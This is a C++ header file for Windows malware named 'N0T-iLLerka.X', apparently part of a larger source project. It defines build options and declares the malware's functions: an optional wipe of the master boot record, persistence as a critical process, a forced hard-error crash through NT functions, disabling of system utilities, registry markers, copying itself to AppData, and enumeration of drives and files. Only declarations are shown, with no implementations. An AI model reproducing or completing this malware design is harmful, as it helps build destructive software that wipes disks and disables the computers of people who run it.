#pragma once

// Warning Message: //
/* #define DISABLE_WARNING */
	// If defined: Shows the user a warning message that he is about to execute Malware.
	//			   ( IT IS NOT RECOMMENDED TO DISABLE THIS FEATURE ! )

// Kill MasterBootRecord: //
/* #define KILL_MBR */
	// If defined: Kills the MBR (MasterBootRecord) by overwriting it (with Zeros)
	//			   (Optional)


//// Debug Mode: ////
#define DEBUG
	// If defined: Allows you to disables security features, used by the Malware to prevent the user from tampering with it.
	//			   Also allows you to enable certain debugging features.

//// Debug Suboptions: (some might require DEBUG Mode to be enabled) ////
#ifdef DEBUG
	// Show Debug Messages: //
	#define DEBUG_MSG
		// If defined: Shows the user Error/Warning/Information/(Question) MessageBoxes used for debbuging.

	// NT Process Persistency: //
	#define DISABLE_NT_FUNCTIONS
		// If defined: Disables and prevents the Malware from utilizing the NT Functions used for Process Persistency.

	// Mutex utilization: //
	/* #define DISABLE_MUTEX */
		// If defined: Disables the usage of the Global Mutex
		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)

	// Semaphore utilization: //
	/* #define DISABLE_SEMAPHORE */
		// If defined: Disables the usage of the Global Semaphore
		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)
#endif

// Debug MessageBox Template //
/*
	#ifdef DEBUG_MSG
		MessageBox(NULL, L"", L"", MB_OK |  MB_ICON | MB_SYSTEMMODAL);
	#endif // DEBUG_MSG
*/

// Header Files //
#include <Windows.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <Shlobj.h>
#include <Shlwapi.h>

// Libraries //
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

#ifndef DISABLE_NT_FUNCTIONS
#pragma comment(lib, "ntdll.lib")
#endif // !DISABLE_NT_FUNCTIONS

// Define Macros //
#define MALWR_NAME L"N0T-iLLerka.X"

#define MIN_RSLEN 8
#define MAX_RSLEN 16

#define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
#define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
#define MAX_SMPO 256

#define REGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
#define REGISTRY_SUBKEY L"N0TiLLerka"
#define REGISTRY_VALUE 0xBADC0DE

// Function Macros //
#define RandomStringGenerator	RandomStringGeneratorW
#define CreateRegistryKey		CreateRegistryKeyW
#define CheckRegistryKey		CheckRegistryKeyW
#define DriveEnumerator			DriveEnumeratorW
#define CopyFileAppData			CopyFileAppDataW
#define DirectoryIeterator		DirectoryIeteratorW

#ifndef DISABLE_MUTEX
#define CheckMutex				CheckMutexW
#endif // !DISABLE_MUTEX
#ifndef DISABLE_SEMAPHORE
#define CheckSemaphore			CheckSemaphoreW
#endif // !DISABLE_SEMAPHORE

// Arrays //
extern const WCHAR CharSet[];
extern const size_t nCharSet;

// FileSystem Functions //
BOOL CopyFileAppDataW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR mfn[]);
BOOL DriveEnumeratorW(std::vector<std::wstring>& vwsDrive);
BOOL DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile);

#ifdef KILL_MBR
BOOL OverwriteMBR(VOID);
#endif // KILL_MBR

// Synchronization Functions //
#ifndef DISABLE_MUTEX
BOOL CheckMutexW(LPCWSTR lpName);
#endif // !DISABLE_MUTEX
#ifndef DISABLE_SEMAPHORE
BOOL CheckSemaphoreW(LPCWSTR lpName);
#endif // !DISABLE_SEMAPHORE

// RegEdit Functions //
BOOL CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
BOOL CheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD edwType, BYTE ebValue);
BOOL DisableUtilities(VOID);

// Utilitie Functions //
INT RandomNumberGenerator(VOID);
std::wstring RandomStringGeneratorW(INT rsg_strlen);
BOOL IsUserAdmin(VOID);

// NT Utilitie Functions //
#ifndef DISABLE_NT_FUNCTIONS
BOOL ImportNTDLLFunctions(VOID);
BOOL NTSetProcessIsCritical(BOOLEAN blIscritical);
BOOL NTRaiseHardError(VOID);
#endif // !DISABLE_NT_FUNCTIONS